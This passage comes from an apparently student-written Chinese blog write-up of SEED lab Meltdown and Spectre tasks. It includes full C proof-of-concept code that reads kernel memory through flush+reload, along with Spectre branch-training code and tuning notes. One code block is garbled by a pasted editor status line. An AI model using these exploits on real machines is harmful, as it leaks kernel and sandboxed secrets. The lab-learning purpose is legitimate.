</span></span><br><span class="line"><span class="params">       <span class="string">&quot;add $0x141, %%eax;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;.endr;&quot;</span>                    </span></span><br><span class="line"><span class="params">    </span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       : <span class="string">&quot;eax&quot;</span></span></span><br><span class="line"><span class="params">   )</span>; </span><br><span class="line">    </span><br><span class="line">   <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">   kernel_data = *(<span class="type">char</span>*)kernel_data_addr;  </span><br><span class="line">   <span class="built_in">array</span>[kernel_data * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;           </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// signal handler</span></span><br><span class="line"><span class="type">static</span> sigjmp_buf jbuf;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">catch_segv</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  siglongjmp(jbuf, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Register a signal handler</span></span><br><span class="line">  signal(SIGSEGV, catch_segv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FLUSH the probing array</span></span><br><span class="line">  flushSideChannel();</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (sigsetjmp(jbuf, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">     meltdown(<span class="number">0xfb61b000</span>);                </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Memory access violation!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// RELOAD the probing array</span></span><br><span class="line">  reloadSideChannel();                     </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码第53行其实就是模拟了把第七个数组元素加载到cache中。所以按理来说我们就应该输出secret=7。本质上这里并没有涉及meltdown获取内核信息。一下需要多尝试几次就能成功了。</p>
+<p><img src="/.io//image-20220407193851723.png" alt="image-20220407193851723"></p>
+<h2 id="task7-1"><a href="#task7-1" class="headerlink" title="task7.1"></a>task7.1</h2><p>首先尝试修改task6的代码到能够读取内核数据。这也很简单，因为之前是写死的第七个cache。这里只要改成<code>array[kernel_data * 4096 + DELTA ]</code>即可。但是我经过很多次尝试，即使修改了threshold到200也没有成功。</p>
+<p>关于修改delta以及这里写4096的原因是：OS里面的一个页面大小是4K,选择DELTA的原因是为了防止0那里有部分数据结构重复。</p>
+<p>同时这里经常返回0的原因是，如果当操作系统检查出来权限不对时，往往会先返回0。可能和spectre的sandbox检查类似。</p>
+<p><img src="/.io//image-20220407203844688.png" alt="image-20220407203844688"></p>
+<h2 id="task7-2"><a href="#task7-2" class="headerlink" title="task7.2"></a>task7.2</h2><p>尝试了直接在代码的main函数部分加上打开文件部分。提前把kern地址加载进来到CPU_cache里面。这样我们执行后面的加法语句就会快很多。</p>
+<p><img src="/.io//image-20220421145721129.png" alt="image-20220421145721129"></p>
+<p><img src="/.io//image-20220407205703737.png" alt="image-20220407205703737"></p>
+<p>但是尽管尝试了修改上界，但是还是不行，不能提前于检查权限获取相应数据。</p>
+<h2 id="task7-3-asm-problem"><a href="#task7-3-asm-problem" class="headerlink" title="task7.3 asm problem"></a>task7.3 asm problem</h2><p>这次直接尝试用汇编触发meltdown。代码如下。尝试解释一下。这里CPU执行的时候会暂停到内联汇编这里(因为很耗时，不停循环做加法，并且由于只能对这一个寄存器操作，所以不能并行)由于乱序执行，CPU会执行到一定数量的add eax后，先执行下面读取kerneldata的部分，获取数据。然而此时ALU单元正在被占用。可以延长检查kernel页表权限的时间。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">meltdown_asm</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Give eax register something to do</span></span><br><span class="line">   <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">       <span class="string">&quot;.rept 400;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;add $0x141, %%eax;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;.endr;&quot;</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       : <span class="string">&quot;eax&quot;</span></span></span><br><span class="line"><span class="params">   )</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">   kernel_data = *(<span class="type">char</span>*)kernel_data_addr;</span><br><span class="line">   <span class="built_in">array</span>[kernel_data * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过长时间的尝试，终于成功了。结果如下图。</p>
+<p><img src="/.io//image-20220407213402700.png" alt="image-20220407213402700"></p>
+<p>可以看到读出了第一个secret是83。也就是’S’的ascii表示。</p>
+<p>为了读出上述数据，需要融合7.2中的代码，也就是事先利用文件操作读取内核中的相关数据加载到内存中，之后利用<code>meltdown</code>攻击。如下图</p>
+<p><img src="/.io//image-20220407213819615.png" alt="image-20220407213819615">但是可以看出成功概率依然很低。</p>
+<p>尝试增加或者减少循环的次数，看会不会有帮助。我尝试了把循环从400改成4000或者40000，4000的时候有过几次成功，但是发现当改成40000的时候几乎不能成功。但是打开发现编译器似乎没有做优化。这里还不太清楚原因是什么。</p>
+<p><img src="/.io//image-20220407214922124.png" alt="image-20220407214922124"></p>
+<p>总结一下上面所做的优化。</p>
+<ol>
+<li>提前读取secret字符串到cpu_cache。利用之前写的内核模块。</li>
+<li>使用汇编代码+汇编代码内部循环占用ALU，减慢权限检查速度。如想从原理的角度解释汇编循环的意义：重复的汇编占据了ALU，并且只作用在一个寄存器上，不能并行执行。然而当想要访问内核地址时，OS会在译码(不确定)位置提前准备好内存给CPU。然而后面的权限检查需要ALU的参与(回想一下自己写的操作系统，也是先找到了那个内存所在位置，再检查那个页面的权限是否正确的，因此无论如何都会提前load出来)</li>
+</ol>
+<h2 id="task8"><a href="#task8" class="headerlink" title="task8"></a>task8</h2><p>经过简单修改上述代码，就能够成功的一次性获取所有kernel里面的内容了。可以看到我们获取的内容是正确的。</p>
+<p><img src="/.io//image-20220407222031706.png" alt="image-20220407222031706"></p>
+<p>代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="comment">/* cache hit time threshold assumed*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里注意修改score为非静态，否则无法重置其内容。</span></span><br><span class="line"> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">     addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">     time1 = __rdtscp(&amp;junk);</span><br><span class="line">     junk = *addr;</span><br><span class="line">     time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">     <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">        scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">meltdown_asm</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Give eax register something to do</span></span><br><span class="line">   <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">       <span class="string">&quot;.rept 400;&quot;</span>                </span></span><br><span class="line"><span class="params">       <span class="string">&quot;add $0x141, %%eax;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;.endr;&quot;</span>                    </span></span><br><span class="line"><span class="params">    </span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       : <span class="string">&quot;eax&quot;</span></span></span><br><span class="line"><span class="params">   )</span>; </span><br><span class="line">    </span><br><span class="line">   <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">   kernel_data = *(<span class="type">char</span>*)kernel_data_addr;  </span><br><span class="line">   <span class="built_in">array</span>[kernel_data * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;              </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// signal handler</span></span><br><span class="line"><span class="type">static</span> sigjmp_buf jbuf;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">catch_segv</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   siglongjmp(jbuf, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i, j, ret = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Register signal handler</span></span><br><span class="line">  signal(SIGSEGV, catch_segv);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/secret_data&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(scores, <span class="number">0</span>, <span class="keyword">sizeof</span>(scores));</span><br><span class="line">  flushSideChannel();</span><br><span class="line"> <span class="type">int</span> index=<span class="number">0</span>; </span><br><span class="line"> <span class="comment">// 加上有关index的循环，一次性爆破所有位置</span></span><br><span class="line"><span class="keyword">for</span>(;index&lt;<span class="number">8</span>;index++)&#123;	  </span><br><span class="line">  <span class="comment">// Retry 1000 times on the same address.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">	ret = pread(fd, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	  perror(<span class="string">&quot;pread&quot;</span>);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Flush the probing array</span></span><br><span class="line">	<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) </span><br><span class="line">		_mm_clflush(&amp;<span class="built_in">array</span>[j * <span class="number">4096</span> + DELTA]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sigsetjmp(jbuf, <span class="number">1</span>) == <span class="number">0</span>) &#123; meltdown_asm(<span class="number">0xf90a3000</span>+index); &#125;</span><br><span class="line"></span><br><span class="line">	reloadSideChannelImproved();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the index with the highest score.</span></span><br><span class="line">  <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">	<span class="keyword">if</span> (scores[max] &lt; scores[i]) max = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The secret value for %d is %d %c\n&quot;</span>,index, max, max);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">scores[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="spectre"><a href="#spectre" class="headerlink" title="spectre"></a>spectre</h1><h2 id="task3-1"><a href="#task3-1" class="headerlink" title="task3"></a>task3</h2><p>3.1首先介绍了乱序执行的原理。CPU会记录下之前执行过的指令挑选的分支。因此我们需要先”训练CPU”一直挑选我们制定的分支开始乱序执行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span> &#123; <span class="comment">// 下面的参数size=10</span></span><br><span class="line"><span class="keyword">if</span> (x &lt; size) &#123; temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA]; &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123; </span><br><span class="line">    victim(i);  <span class="comment">// i&lt;10，因此可以在victim里面一直通过判断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来如果我们尝试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim(<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
+
+<p>经过训练的CPU依然会执行这条指令，选择true的分支跳转。<img src="/.io//image-20220409151911045.png" alt="image-20220409151911045"></p>
+<h3 id="注释flush-size"><a href="#注释flush-size" class="headerlink" title="注释flush_size"></a>注释flush_size</h3><p>如果把flush_size注释掉，成功概率就变得很低了</p>
+<p><img src="/.io//image-20220409152120795.png" alt="image-20220409152120795"></p>
+<p>这是因为把如果不flush size，那么下一次在victim判断的时候size已经在本地的TLB或者CPU cache甚至寄存器中，访问并比较size和x的时间将会变得很少。这样的事件还来不及执行乱序执行来加载出我们的数组到内存。</p>
+<h3 id="replace-with-i-20"><a href="#replace-with-i-20" class="headerlink" title="replace with (i+20)"></a>replace with (i+20)</h3><p>可以看到成功概率也大大下降了。这是因为我们相当于训练了CPU每次都是false的结果。让CPU不会经过这样的分支选择。</p>
+<p><img src="/.io//image-20220409152613890.png" alt="image-20220409152613890"></p>
+<h2 id="task4-1"><a href="#task4-1" class="headerlink" title="task4"></a>task4</h2><p>这里我们尝试真正使用specture去模拟攻击一个类似现实中沙箱的情景。原理如上。可以看到能够攻击成功。</p>
+<p><img src="/.io//image-20220409153717215.png" alt="image-20220409153717215"></p>
+<p>然而并不是每次都能成功(这也很正常)因为我们也无法预测CPU的noise什么时候产生。</p>
+<p><img src="/.io//image-20220409153826120.png" alt="image-20220409153826120"></p>
+<h2 id="task5-1"><a href="#task5-1" class="headerlink" title="task5"></a>task5</h2><h3 id="problem1"><a href="#problem1" class="headerlink" title="problem1"></a>problem1</h3><p>可以看出确实每次成功的不一定是正确的，相反第一个元素的加载时间比较短。</p>
+<p><img src="/.io//image-20220409155633226.png" alt="image-20220409155633226"></p>
+<p>发生这种情况的原因是，<strong>毕竟大部分情况下meltdown攻击可能不成功，这种情况下restricted返回值位0，因此我们就把array[0]加载到了内存</strong>。这种情况实际上是失败情况。因此我们要排除。</p>
+<p>经过简单的修改(去除0号元素)可以得到下面的结果。发现确实是正确的。</p>
+<p><img src="/.io//image-20220409155924727.png" alt="image-20220409155924727"></p>
+<h3 id="problem2"><a href="#problem2" class="headerlink" title="problem2"></a>problem2</h3><p>这里我也不清楚。按照老师和同学们的讨论，应该和usleep时一个意思，拖延时间用的。</p>
+<h3 id="problem3-USLEEP"><a href="#problem3-USLEEP" class="headerlink" title="problem3 USLEEP"></a>problem3 USLEEP</h3><p>usleep终止了用户线程，但是OS对于内存的load并没有停止。这里加上可以让内存被load出来更有可能。同时查阅资料，一次传统的磁盘访问(随机访问)大约需要几十万时钟周期，15毫秒(ms)左右。一次usleep(10)是休息10微秒(μs),而一个ms是1000μs。所以考虑到磁盘读写，可能需要较大的usleep参数，比如15000(这是平均访问时间)，能够尽可能多的执行内存调出的命令。</p>
+<p><img src="/.io//image-20220409163052620.png" alt="image-20220409163052620"></p>
+<p>经过尝试，当我们适当调高usleep的秒数时，成功率会提高。注意到下面的number of hits确实提高了。</p>
+<p><img src="/.io//image-20220420201036926.png" alt="image-20220420201036926"></p>
+<h2 id="task6-1"><a href="#task6-1" class="headerlink" title="task6"></a>task6</h2><p>在main中加了一个简单的遍历循环。可以很方便的的到最后的结果。如下图所示。我最终把目标字符串直接打印了出来。</p>
+<p><img src="/.io//image-20220414153807373.png" alt="image-20220414153807373"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="type">uint8_t</span> temp    = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>    *secret = <span class="string">&quot;Seed_Lab&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">                                                                                                                                          32,3          Top <span class="type">static</span> <span class="type">int</span> scores[256];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - 